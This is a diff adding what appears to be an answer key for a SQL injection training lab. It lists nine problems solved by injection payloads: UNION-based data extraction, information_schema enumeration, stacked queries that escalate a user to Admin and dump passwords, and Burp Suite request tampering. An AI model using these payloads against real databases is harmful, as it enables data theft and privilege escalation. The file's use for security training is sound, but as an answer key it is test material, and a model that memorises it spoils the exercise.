@@ -1,0 +1,71 @@
+Problem #1:
+    1 UNION SELECT * from db_employees
+
+Problem #2:
+    First Name: a
+    Last Name: b'; select id,first_Name,last_name from db_employees where '1' = '1' --#
+
+Problem #3:
+   Step #1: 1 union select 1,column_name,column_name,4
+            from information_schema.columns
+            where table_name like 'db_clothing_shop'
+
+   Step #2: 1 union select barcode,item_name, manufacturer, price from db_clothing_shop
+
+Problem #4:
+    postgres
+
+Problem #5:
+        use burpsuite, modify input to use wild card %
+
+Problem #6:
+    bingo
+
+Problem #7:
+    Open browser through bupsuite, press the 'search' button on the page
+    while listening to the connection.
+    Change 'User-Agent' to E'%\%' and forward the packet.
+
+Problem #8:
+    Note: Trying to get an error message gets the table name.
+    Trying to access the table with will result in special 'no access message'
+
+    Step #1: a'; SELECT table_schema,table_name
+               FROM information_schema.tables
+               WHERE table_schema LIKE 'public'
+               ORDER BY table_schema, table_name--#
+    Need to find the table where user data is store - db_users
+
+    Step #2: a'; select * from db_users --#
+    To get all rows -> will see admin, manager and user roles
+
+    Step #2.5: In case user doesn't guess or finds out the column 'role'
+    it's possible to get it by the following command:
+    1'; select * from information_schema.columns where table_name='db_users' --#
+
+    Step #3: Update user privileges, then try to access the secret_safe
+    a'; UPDATE db_users SET role = 'Admin' WHERE db_users.username = 'YOUR_USERNAME'; select * from db_users; select prize from secret_safe where 1=1 --#
+
+    # Other Version
+    Step #1: Find db_users
+        username: a
+        password: a'; SELECT table_schema,table_name
+                   FROM information_schema.tables
+                   WHERE table_schema LIKE 'public'
+                   ORDER BY table_schema, table_name--#
+    Step #2: Find admin user
+        username: a
+        password: b'; select * from db_users --#
+    Step #3: Find admins' password
+        username: a
+        password: b'; select username,password from db_users where username like 'test' --#
+    Step #4 : Login as admin with username yxilith and password found from step 3
+
+
+Problem #9:
+    Step #1:
+        Open burpsuite and change 'connection_time' variable to exceed 'cookie_ready_time'
+    Step #2:
+        In the minimum price field: 1
+        In the maximum price field: 2 union select price,num_of_accidents,total_km FROM db_vehicles
+        Make sure the condition of step #1 always fulfilled
